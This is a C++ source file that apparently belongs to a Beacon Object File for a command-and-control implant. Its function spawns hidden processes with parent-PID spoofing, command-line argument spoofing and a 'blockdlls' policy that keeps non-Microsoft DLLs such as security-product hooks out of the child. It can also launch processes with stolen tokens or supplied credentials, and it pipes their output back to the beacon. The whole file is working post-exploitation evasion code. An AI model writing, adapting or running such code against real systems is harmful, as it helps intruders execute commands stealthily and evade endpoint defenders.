#include <general.h>
#include <externs.h>

#define PIPE_READ_TIMEOUT_MS  10000
#define PIPE_POLL_INTERVAL_MS 100

#ifndef MIN
#define MIN(a, b) (((a) < (b)) ? (a) : (b))
#endif

auto kh_process_creation( 
    _In_  PS_CREATE_ARGS*      create_args,
    _Out_ PROCESS_INFORMATION* ps_information
) -> NTSTATUS {
    auto process_cmdline = (*create_args->spoofarg ? create_args->spoofarg : create_args->argument);
    auto process_info    = PROCESS_INFORMATION{ 0 };
    auto startup_info_ex = STARTUPINFOEXW{ 0 };
    auto startup_info    = STARTUPINFOW{ 0 };
    auto security_attr   = SECURITY_ATTRIBUTES{ sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };

    auto process_flags   = DWORD{ CREATE_NO_WINDOW };
    auto process_policy  = UINT_PTR{ 0 };

    auto pipe_read      = HANDLE{ nullptr };
    auto pipe_write     = HANDLE{ nullptr };
    auto pipe_duplicate = HANDLE{ nullptr };
    auto parent_handle  = HANDLE{ nullptr };

    auto attribute_buff = PVOID{ nullptr };
    auto attribute_size = SIZE_T{ 0 };

    auto update_attr_count = 0;
    auto use_extended_info = FALSE;

    NTSTATUS status  = STATUS_UNSUCCESSFUL;
    BOOL     success = FALSE;

    DbgPrint( "[kh_process_creation] Starting - cmdline: %ls\n", process_cmdline );
    DbgPrint( "[kh_process_creation] method: %d, pipe: %d, ppid: %d, blockdlls: %d\n", 
        create_args->method, create_args->pipe, create_args->ppid, create_args->blockdlls );

    auto cleanup = [&]( NTSTATUS ret_status ) -> NTSTATUS {
        DbgPrint( "[cleanup] Cleaning up resources - status: 0x%X\n", ret_status );

        if ( attribute_buff ) {
            DeleteProcThreadAttributeList( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff );
            free( attribute_buff );
            DbgPrint( "[cleanup] Freed attribute_buff\n" );
        }

        if ( pipe_read     ) { CloseHandle( pipe_read     ); DbgPrint( "[cleanup] Closed pipe_read\n"     ); }
        if ( pipe_write    ) { CloseHandle( pipe_write    ); DbgPrint( "[cleanup] Closed pipe_write\n"    ); }
        if ( parent_handle ) { CloseHandle( parent_handle ); DbgPrint( "[cleanup] Closed parent_handle\n" ); }

        return ret_status;
    };

    use_extended_info = ( create_args->method == Create::Default );
    DbgPrint( "[kh_process_creation] use_extended_info: %d\n", use_extended_info );

    if ( use_extended_info ) {
        if ( create_args->ppid      ) update_attr_count++;
        if ( create_args->blockdlls ) update_attr_count++;
    }

    DbgPrint( "[kh_process_creation] update_attr_count: %d\n", update_attr_count );

    if ( update_attr_count > 0 ) {
        InitializeProcThreadAttributeList( nullptr, update_attr_count, 0, &attribute_size );
        DbgPrint( "[kh_process_creation] attribute_size: %zu\n", attribute_size );
        
        attribute_buff = malloc( attribute_size );
        if ( !attribute_buff ) {
            DbgPrint( "[kh_process_creation] ERROR: Failed to allocate attribute buffer\n" );
            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate attribute buffer" );
            return cleanup( STATUS_NO_MEMORY );
        }

        if ( !InitializeProcThreadAttributeList( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, update_attr_count, 0, &attribute_size ) ) {
            DbgPrint( "[kh_process_creation] ERROR: InitializeProcThreadAttributeList failed: %d\n", GetLastError() );
            BeaconPrintf( CALLBACK_ERROR, "Failed to initialize attribute list: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
            return cleanup( STATUS_UNSUCCESSFUL );
        }

        DbgPrint( "[kh_process_creation] Attribute list initialized\n" );
    }

    if ( use_extended_info && create_args->ppid ) {
        DbgPrint( "[kh_process_creation] Opening parent process: %d\n", create_args->ppid );
        
        parent_handle = OpenProcess( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, create_args->ppid );
        if ( !parent_handle ) {
            DbgPrint( "[kh_process_creation] ERROR: OpenProcess failed: %d\n", GetLastError() );
            BeaconPrintf( CALLBACK_ERROR, "Failed to open parent process %d: (%d) %ls", create_args->ppid, GetLastError(), fmt_error( GetLastError() ) );
            return cleanup( status );
        }

        DbgPrint( "[kh_process_creation] parent_handle: %p\n", parent_handle );

        if ( !UpdateProcThreadAttribute( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent_handle, sizeof(HANDLE), nullptr, nullptr ) ) {
            DbgPrint( "[kh_process_creation] ERROR: UpdateProcThreadAttribute (PPID) failed: %d\n", GetLastError() );
            BeaconPrintf( CALLBACK_ERROR, "Failed to update parent process attribute: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
            return cleanup( status );
        }

        DbgPrint( "[kh_process_creation] PPID attribute set\n" );
    }

    if ( use_extended_info && create_args->blockdlls ) {
        process_policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        DbgPrint( "[kh_process_creation] Setting blockdlls policy: 0x%llX\n", process_policy );
        
        if ( !UpdateProcThreadAttribute( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &process_policy, sizeof(UINT_PTR), nullptr, nullptr ) ) {
            DbgPrint( "[kh_process_creation] ERROR: UpdateProcThreadAttribute (BlockDLLs) failed: %d\n", GetLastError() );
            BeaconPrintf( CALLBACK_ERROR, "Failed to update mitigation policy attribute: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
            return cleanup( status );
        }

        DbgPrint( "[kh_process_creation] BlockDLLs attribute set\n" );
    }

    if ( use_extended_info ) {
        startup_info_ex.StartupInfo.cb          = sizeof( STARTUPINFOEXW );
        startup_info_ex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
        startup_info_ex.StartupInfo.wShowWindow = SW_HIDE;
        
        if ( attribute_buff ) {
            startup_info_ex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff;
            process_flags |= EXTENDED_STARTUPINFO_PRESENT;
        }

        DbgPrint( "[kh_process_creation] Using STARTUPINFOEXW - flags: 0x%X\n", process_flags );
    } else {
        startup_info.cb          = sizeof( STARTUPINFOW );
        startup_info.dwFlags     = STARTF_USESHOWWINDOW;
        startup_info.wShowWindow = SW_HIDE;

        DbgPrint( "[kh_process_creation] Using STARTUPINFOW\n" );
    }

    if ( create_args->pipe ) {
        DbgPrint( "[kh_process_creation] Creating pipe...\n" );

        if ( !CreatePipe( &pipe_read, &pipe_write, &security_attr, 0 ) ) {
            DbgPrint( "[kh_process_creation] ERROR: CreatePipe failed: %d\n", GetLastError() );
            BeaconPrintf( CALLBACK_ERROR, "Failed to create pipe: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
            return cleanup( status );
        }

        DbgPrint( "[kh_process_creation] Pipe created - read: %p, write: %p\n", pipe_read, pipe_write );

        SetHandleInformation( pipe_read, HANDLE_FLAG_INHERIT, 0 );
        DbgPrint( "[kh_process_creation] pipe_read set to non-inheritable\n" );

        if ( use_extended_info && create_args->ppid && parent_handle ) {
            DbgPrint( "[kh_process_creation] Duplicating pipe handle to parent...\n" );

            if ( !DuplicateHandle( nt_current_process(), pipe_write, parent_handle, &pipe_duplicate, 0, TRUE, DUPLICATE_SAME_ACCESS ) ) {
                DbgPrint( "[kh_process_creation] ERROR: DuplicateHandle failed: %d\n", GetLastError() );
                BeaconPrintf( CALLBACK_ERROR, "Failed to duplicate pipe handle: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
                return cleanup( status );
            }

            CloseHandle( pipe_write );
            pipe_write = pipe_duplicate;
            DbgPrint( "[kh_process_creation] pipe_write duplicated: %p\n", pipe_write );
        }

        if ( use_extended_info ) {
            startup_info_ex.StartupInfo.dwFlags    |= STARTF_USESTDHANDLES;
            startup_info_ex.StartupInfo.hStdError   = pipe_write;
            startup_info_ex.StartupInfo.hStdOutput  = pipe_write;
            startup_info_ex.StartupInfo.hStdInput   = GetStdHandle( STD_INPUT_HANDLE );
            DbgPrint( "[kh_process_creation] Std handles set (extended) - dwFlags: 0x%X\n", startup_info_ex.StartupInfo.dwFlags );
        } else {
            startup_info.dwFlags    |= STARTF_USESTDHANDLES;
            startup_info.hStdError   = pipe_write;
            startup_info.hStdOutput  = pipe_write;
            startup_info.hStdInput   = GetStdHandle( STD_INPUT_HANDLE );
            DbgPrint( "[kh_process_creation] Std handles set (basic) - dwFlags: 0x%X\n", startup_info.dwFlags );
        }
    }

    DbgPrint( "[kh_process_creation] Creating process with method: %d\n", create_args->method );

    switch ( create_args->method ) {
        case Create::Default: {
            DbgPrint( "[kh_process_creation] Calling CreateProcessW\n" );
            success = CreateProcessW(
                nullptr, process_cmdline, nullptr, nullptr, TRUE, process_flags, 
                nullptr, nullptr, &startup_info_ex.StartupInfo, &process_info
            );
            break;
        }

        case Create::WithLogon: {
            DbgPrint( "[kh_process_creation] Calling CreateProcessWithLogonW - user: %ls, domain: %ls\n", 
                create_args->username, create_args->domain );
            success = CreateProcessWithLogonW(
                create_args->username, create_args->domain, create_args->password, LOGON_WITH_PROFILE,
                nullptr, process_cmdline, CREATE_NO_WINDOW, nullptr, nullptr, &startup_info, &process_info
            );
            break;
        }

        case Create::WithToken: {
            DbgPrint( "[kh_process_creation] Calling CreateProcessWithTokenW - token: %p\n", create_args->token );
            success = CreateProcessWithTokenW(
                create_args->token, LOGON_WITH_PROFILE, nullptr, process_cmdline, 
                CREATE_NO_WINDOW, nullptr, nullptr, &startup_info, &process_info 
            );
            break;
        }

        default: {
            DbgPrint( "[kh_process_creation] ERROR: Unknown method: %d\n", create_args->method );
            BeaconPrintf( CALLBACK_ERROR, "Unknown process creation method: %d", create_args->method );
            return cleanup( STATUS_INVALID_PARAMETER );
        }
    }

    if ( !success ) {
        DbgPrint( "[kh_process_creation] ERROR: Process creation failed: %d\n", GetLastError() );
        BeaconPrintf( CALLBACK_ERROR, "Failed to create process with error: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
        return cleanup( GetLastError() );
    }

    DbgPrint( "[kh_process_creation] Process created - PID: %d, TID: %d, hProcess: %p, hThread: %p\n", 
        process_info.dwProcessId, process_info.dwThreadId, process_info.hProcess, process_info.hThread );

    BeaconPrintf( CALLBACK_OUTPUT, "Process created - PID: %d | TID: %d\n", process_info.dwProcessId, process_info.dwThreadId );

    if ( pipe_write ) {
        CloseHandle( pipe_write );
        pipe_write = nullptr;
        DbgPrint( "[kh_process_creation] Closed pipe_write before reading\n" );
    }

    // =========================================================================
    // Read pipe output
    // =========================================================================
    if ( create_args->pipe && pipe_read ) {
        DbgPrint( "[pipe_read] Starting pipe read loop\n" );

        DWORD  total_elapsed   = 0;
        DWORD  bytes_available = 0;
        DWORD  bytes_read      = 0;
        BYTE   read_buffer[4096];
        BOOL   process_exited  = FALSE;

        SIZE_T output_capacity = 0x10000;
        SIZE_T output_size     = 0;
        PBYTE  output_buffer   = (PBYTE)malloc( output_capacity );

        if ( !output_buffer ) {
            DbgPrint( "[pipe_read] ERROR: Failed to allocate output buffer\n" );
            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate output buffer" );
        } else {
            DbgPrint( "[pipe_read] Output buffer allocated: %p (capacity: %zu)\n", output_buffer, output_capacity );

            while ( total_elapsed < PIPE_READ_TIMEOUT_MS ) {
                DWORD wait_result = WaitForSingleObject( process_info.hProcess, 0 );
                if ( wait_result == WAIT_OBJECT_0 ) {
                    if ( !process_exited ) {
                        DbgPrint( "[pipe_read] Process exited\n" );
                    }
                    process_exited = TRUE;
                }

                bytes_available = 0;
                BOOL peek_result = PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr );
                
                if ( !peek_result ) {
                    DWORD peek_error = GetLastError();
                    DbgPrint( "[pipe_read] PeekNamedPipe failed: %d\n", peek_error );
                    
                    if ( peek_error == ERROR_BROKEN_PIPE ) {
                        DbgPrint( "[pipe_read] Pipe broken - exiting loop\n" );
                        break;
                    }
                }

                DbgPrint( "[pipe_read] bytes_available: %d, process_exited: %d, elapsed: %d\n", 
                    bytes_available, process_exited, total_elapsed );

                if ( bytes_available > 0 ) {
                    DbgPrint( "[pipe_read] Reading %d bytes...\n", bytes_available );

                    while ( bytes_available > 0 ) {
                        DWORD to_read = MIN( bytes_available, (DWORD)sizeof(read_buffer) );
                        bytes_read = 0;

                        if ( !ReadFile( pipe_read, read_buffer, to_read, &bytes_read, nullptr ) ) {
                            DbgPrint( "[pipe_read] ReadFile failed: %d\n", GetLastError() );
                            break;
                        }

                        if ( bytes_read == 0 ) {
                            DbgPrint( "[pipe_read] ReadFile returned 0 bytes\n" );
                            break;
                        }

                        DbgPrint( "[pipe_read] Read %d bytes\n", bytes_read );

                        // Grow buffer if needed
                        while ( output_size + bytes_read > output_capacity ) {
                            SIZE_T new_capacity = output_capacity * 2;
                            DbgPrint( "[pipe_read] Growing buffer: %zu -> %zu\n", output_capacity, new_capacity );
                            
                            PBYTE new_buffer = (PBYTE)realloc( output_buffer, new_capacity );
                            
                            if ( !new_buffer ) {
                                DbgPrint( "[pipe_read] ERROR: realloc failed - flushing buffer\n" );
                                if ( output_size > 0 ) {
                                    BeaconPrintf( CALLBACK_OUTPUT, "%.*s", (int)output_size, output_buffer );
                                    output_size = 0;
                                }
                                break;
                            }
                            
                            output_buffer   = new_buffer;
                            output_capacity = new_capacity;
                        }

                        if ( output_size + bytes_read <= output_capacity ) {
                            memcpy( output_buffer + output_size, read_buffer, bytes_read );
                            output_size += bytes_read;
                            DbgPrint( "[pipe_read] Buffer now has %zu bytes\n", output_size );
                        }

                        bytes_available -= bytes_read;
                    }

                    total_elapsed = 0;
                } else {
                    if ( process_exited ) {
                        DbgPrint( "[pipe_read] Process exited, checking for final data...\n" );
                        WaitForSingleObject( nt_current_process(), 50 );
                        
                        if ( PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr ) && bytes_available == 0 ) {
                            DbgPrint( "[pipe_read] No more data - done\n" );
                            break;
                        }
                    } else {
                        WaitForSingleObject( nt_current_process(), PIPE_POLL_INTERVAL_MS );
                        total_elapsed += PIPE_POLL_INTERVAL_MS;
                    }
                }
            }

            DbgPrint( "[pipe_read] Loop ended - output_size: %zu\n", output_size );

            if ( output_size > 0 ) {
                DbgPrint( "[pipe_read] Sending output to beacon\n" );
                
                if ( output_size < output_capacity ) {
                    output_buffer[output_size] = '\0';
                    BeaconPrintf( CALLBACK_OUTPUT, "%s", output_buffer );
                } else {
                    BeaconPrintf( CALLBACK_OUTPUT, "%.*s", (int)output_size, output_buffer );
                }
            } else {
                DbgPrint( "[pipe_read] No output captured\n" );
            }

            free( output_buffer );
            DbgPrint( "[pipe_read] Output buffer freed\n" );
        }
    }

    if ( ps_information ) {
        *ps_information = process_info;
        DbgPrint( "[kh_process_creation] Returning process info to caller\n" );
    } else {
        if ( process_info.hProcess ) CloseHandle( process_info.hProcess );
        if ( process_info.hThread  ) CloseHandle( process_info.hThread  );
        DbgPrint( "[kh_process_creation] Closed process handles (caller didn't want them)\n" );
    }

    DbgPrint( "[kh_process_creation] Done - returning STATUS_SUCCESS\n" );
    return cleanup( STATUS_SUCCESS );
}